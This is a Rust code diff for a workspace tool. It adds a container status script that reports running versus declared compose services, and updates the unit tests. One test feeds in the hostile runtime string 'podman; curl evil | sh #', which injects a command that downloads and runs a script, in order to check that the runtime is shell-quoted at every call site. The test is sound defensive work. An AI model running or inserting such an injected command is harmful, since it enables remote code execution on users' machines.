@@ -315,11 +315,23 @@ pub fn default_script(runtime: &str, event: &str) -> Option<String> {
     let args = match event {
         "up" => "compose up -d",
         "down" => "compose down",
-        "status" => "compose ps -q | wc -l",
+        "status" => return Some(status_script(runtime)),
         "post-remove" => return Some(post_remove_script(runtime)),
         _ => return None,
     };
     Some(format!("{} {args}", crate::remote::shell_quote(runtime)))
+}
+
+/// Output vocabulary matches [`crate::supervise::Health::label`] so `ws list`'s glyph classifier lights up the same way for host and container repos. The ratio is running/declared, not running/last-known-created — a service pulled from `.ws.json` shouldn't inflate the denominator.
+fn status_script(runtime: &str) -> String {
+    format!(
+        "r=$({r} compose ps -q 2>/dev/null | wc -l | tr -d ' '); \
+         t=$({r} compose config --services 2>/dev/null | wc -l | tr -d ' '); \
+         if [ \"${{r:-0}}\" -eq 0 ]; then echo stopped; \
+         elif [ -z \"${{t}}\" ] || [ \"${{t}}\" -eq 0 ]; then echo \"running $r\"; \
+         else echo \"running $r/$t\"; fi",
+        r = crate::remote::shell_quote(runtime),
+    )
 }
 
 /// Enumerate this compose project's built images by reference prefix and `rmi -f` them after `down` — direct because compose's own `--rmi local` scopes via labels that podman-compose (python) doesn't always write. Reference filter naturally excludes pulled bases (`postgres:16`, `redis:7`, …) since compose names built images `<project>-<service>` while pulled ones keep their upstream repo name.
@@ -635,12 +647,31 @@ mod tests {
     fn container_defaults_cover_the_compose_lifecycle() {
         assert_eq!(default_script("podman", "up").as_deref(), Some("podman compose up -d"));
         assert_eq!(default_script("docker", "down").as_deref(), Some("docker compose down"));
-        assert_eq!(
-            default_script("podman", "status").as_deref(),
-            Some("podman compose ps -q | wc -l")
-        );
+        assert!(default_script("podman", "status").is_some(), "container status must have a default");
         assert_eq!(default_script("podman", "post-create"), None);
         assert_eq!(default_script("podman", "nonsense"), None);
+    }
+
+    #[test]
+    fn container_status_default_emits_the_running_slash_declared_ratio_or_stopped() {
+        let s = default_script("podman", "status").expect("status default");
+        assert!(s.contains("podman compose ps -q"), "must count running containers: {s}");
+        assert!(s.contains("podman compose config --services"), "must count declared services for the denominator: {s}");
+        assert!(s.contains("echo stopped"), "must print 'stopped' when nothing runs: {s}");
+        assert!(s.contains(r#"echo "running $r/$t""#), "must print 'running N/M' when some run: {s}");
+        assert!(s.contains(r#"echo "running $r""#), "must fall back to bare count if declared list is unavailable: {s}");
+    }
+
+    #[test]
+    fn container_status_default_quotes_a_hostile_runtime_at_every_site() {
+        let s = default_script("podman; curl evil | sh #", "status").unwrap();
+        assert!(!s.contains("podman; curl evil | sh # compose"), "unquoted runtime leaked: {s}");
+        for site in ["compose ps -q", "compose config --services"] {
+            assert!(
+                s.contains(&format!("'podman; curl evil | sh #' {site}")),
+                "each compose call must be quoted: {s}"
+            );
+        }
     }
 
     #[test]
